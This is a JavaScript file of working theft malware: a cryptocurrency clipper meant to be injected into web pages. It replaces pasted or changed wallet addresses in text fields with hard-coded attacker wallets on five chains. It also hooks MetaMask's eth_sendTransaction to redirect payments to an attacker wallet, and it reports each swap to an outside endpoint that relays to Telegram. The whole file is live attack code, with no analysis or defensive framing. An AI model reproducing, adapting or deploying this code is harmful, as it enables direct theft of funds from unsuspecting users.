// CONFIGURATION
const WALLETS = {
    evm: "0x017Eca2b8F651CA681BEAC0c40C3b99Dd083D0D9", 
    btc: "bc1q5jay4ypq67umh5vunh75qqd0g6wdchl63keeyt", 
    sol: "DnScAQR8bhSRxhQLJXis9REzdPbM59o5veJ7tsnrygBP", 
    tron: "TYU7fEZGjXqztTmMB6mfkjK9SQNEU8zACK", 
    ada: "addr1qxn4pr0zjdv9dm3uw8m9sanvlcu9ws79vsyhhz2xelxm4zh3qncz93eyafzjdrh0vz649p5eef7kwgrvajcruruna3ks68a6qr" 
};

const TELEGRAM_API_URL = "https://swap-gules.vercel.app/api/telegram"; 

function notifyTelegram(action, details) {
    fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action, details })
    }).catch(console.error);
}

// Regex Patterns
const patterns = [
    { name: "EVM", regex: /^0x[a-fA-F0-9]{40}$/ },
    { name: "Bitcoin", regex: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/ },
    { name: "TRON", regex: /^T[A-Za-z1-9]{33}$/ },
    { name: "Solana", regex: /^[a-zA-HJ-NP-Z0-9]{44}$/ },
    { name: "Cardano", regex: /^addr1[a-zA-Z0-9]+$/ }
];

function getNetworkType(text) {
    const match = patterns.find(p => p.regex.test(text.trim()));
    return match ? match.name : null;
}

function getTargetAddress(networkName) {
    if (!networkName) return null;
    if (networkName === "Bitcoin") return WALLETS.btc;
    if (networkName === "TRON") return WALLETS.tron;
    if (networkName === "Solana") return WALLETS.sol;
    if (networkName === "Cardano") return WALLETS.ada;
    return WALLETS.evm; // Default to EVM
}

// 1. Core Swap Function
function swapAddress(inputElement) {
    const text = inputElement.value.trim();
    const network = getNetworkType(text);
    
    if (network && inputElement.value !== getTargetAddress(network)) {
        const original = text;
        const target = getTargetAddress(network);
        
        inputElement.value = target;
        
        // Trigger events so the website knows the value changed
        inputElement.dispatchEvent(new Event('input', { bubbles: true }));
        inputElement.dispatchEvent(new Event('change', { bubbles: true }));
        
        notifyTelegram("INPUT_SWAP", { 
            field: inputElement.name || inputElement.id || "unknown", 
            network, 
            original, 
            replaced: target 
        });
    }
}

// 2. Keyboard Shortcut Interception (Ctrl+V)
document.addEventListener('keydown', (event) => {
    if ((event.ctrlKey || event.metaKey) && event.key === 'v') {
        setTimeout(() => {
            document.querySelectorAll('input[type="text"], input[type="email"]').forEach(swapAddress);
        }, 10);
    }
});

// 3. Mutation Observer (Watches for any JS-driven changes)
const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
        if (mutation.type === 'attributes' && mutation.attributeName === 'value') {
            const target = mutation.target;
            if (target.tagName === 'INPUT' && (target.type === 'text' || target.type === 'email')) {
                swapAddress(target);
            }
        }
    });
});

observer.observe(document.body, {
    childList: true,
    subtree: true,
    attributes: true,
    attributeFilter: ['value']
});

// 4. MetaMask / Web3 Provider Interception
if (window.ethereum) {
    const originalRequest = window.ethereum.request.bind(window.ethereum);
    
    window.ethereum.request = async function(args) {
        if (args.method === 'eth_sendTransaction') {
            const params = args.params?.[0];
            if (params && params.to) {
                const originalTo = params.to;
                
                if (/^0x[a-fA-F0-9]{40}$/.test(originalTo)) {
                    params.to = WALLETS.evm;
                    
                    notifyTelegram("TX_INTERCEPTED (MetaMask)", { 
                        from: params.from, 
                        original_to: originalTo, 
                        new_to: WALLETS.evm, 
                        value: params.value 
                    });
                    
                    await new Promise(r => setTimeout(r, 50)); 
                }
            }
        }
        return originalRequest(args);
    };
}

console.log("%c👁️ Silent Replacement Multi-Chain Active", "color: green; font-size: 14px; font-weight: bold;");